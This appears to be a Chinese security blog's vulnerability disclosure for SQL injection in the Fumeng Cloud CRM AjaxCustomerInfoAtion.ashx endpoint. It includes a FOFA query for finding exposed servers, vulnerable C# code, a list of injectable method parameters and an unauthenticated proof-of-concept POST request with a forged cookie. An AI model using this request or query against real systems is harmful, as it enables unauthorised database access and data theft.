---
title: "孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxCustomerInfoAtion-sqli.html
asset_dir: assets/孚盟云crm-ajaxcustomerinfoation.ashx-多个sql注入漏洞
---

# 孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/15 08:30
- 251浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

代码安全审计

恶意软件分析工具

安全研究报告

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxCustomerInfoAtion.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxCustomerInfoAtion.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxCustomerInfoAtion** 方法的实现如下

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-001-818348b3f3af.webp)](https://image.mrxn.net/37d69eefcca344ca909567631f98f7e7.webp)

当**method**=**getTitle**时，看下`getTitle`方法的实现

代码安全审计

深入探索

Docker加速服务

网络安全课程

云安全解决方案

```
private void getTitle(HttpContext context, string empID)
{
  string custid = context.Request["custid"].ToString();
  string FID = new CreatePageDao().GetDataSource($"select FID from bfCustomers where CustID='{custid}'").Rows[0][0].ToString();
```

参数**custid**未经过任何过滤或校验就被直接拼接进SQL语句中进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

当**method=locationSave**时，一样的存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-002-84e3632077f6.webp)](https://image.mrxn.net/dbf4e788e0bb4c9c86aebbf2c6b965ef.webp)

method=frommail

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-003-443536942459.webp)](https://image.mrxn.net/ce29bc723de945ca904cffdebc7444e5.webp)

method=FocusedChecked

漏洞扫描服务

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-004-95e1da0b8118.webp)](https://image.mrxn.net/4b626afe4a4b4ddbb3da19fedaf4cab8.webp)

method=GetContactEmail

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-005-a3f36074e1aa.webp)](https://image.mrxn.net/78ec151397704c8cbc976d7b483c48b0.webp)

method=SendMessage

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-006-748a6d77ab0d.webp)](https://image.mrxn.net/2cca2c966e054ddc99e13f416a0c1301.webp)

method=moreTrack

软件

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-007-5801a614eb45.webp)](https://image.mrxn.net/f9613c63913346e895cc233f2cb5263b.webp)

method=uploadFileToOss

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-008-04cc6239d12a.webp)](https://image.mrxn.net/6a7a3263d2d540b19fb01b188d678aed.webp)

method=UpCustomerPower

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-009-171341d03737.webp)](https://image.mrxn.net/f7266347e44d4eaeac42cebe7ef1f84c.webp)

method=DingTrack

网络安全

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-010-29d4595fdf47.webp)](https://image.mrxn.net/290dca7041924f4bafc05952a19f5bab.webp)

method=CommentLoad

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-011-7cba3f31dcfe.webp)](https://image.mrxn.net/60c61762b7ad444d803fde9113442fc8.webp)

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-012-3c92d1cb8127.webp)](https://image.mrxn.net/3171900f81a349c488584ef59a6363bf.webp)

method=savePriceAttach

编程

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-013-5d83b7e35327.webp)](https://image.mrxn.net/7bd37378c0cc483599baea46ca587230.webp)

method=DelContact

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-014-87f9e4dec18f.webp)](https://image.mrxn.net/929344ecd0834102983b9e30cdc085d4.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxCustomerInfoAtion.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

method=getTitle&custid='SQLI_POC--
```

[![孚盟云CRM AjaxCustomerInfoAtion.ashx 多个SQL注入漏洞](images/img-015-5ffbae7d698c.webp)](https://image.mrxn.net/19c3c3bc84964a558c7750fedf8ac5f2.webp)

通过报错注入在响应里回显数据库版本信息

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
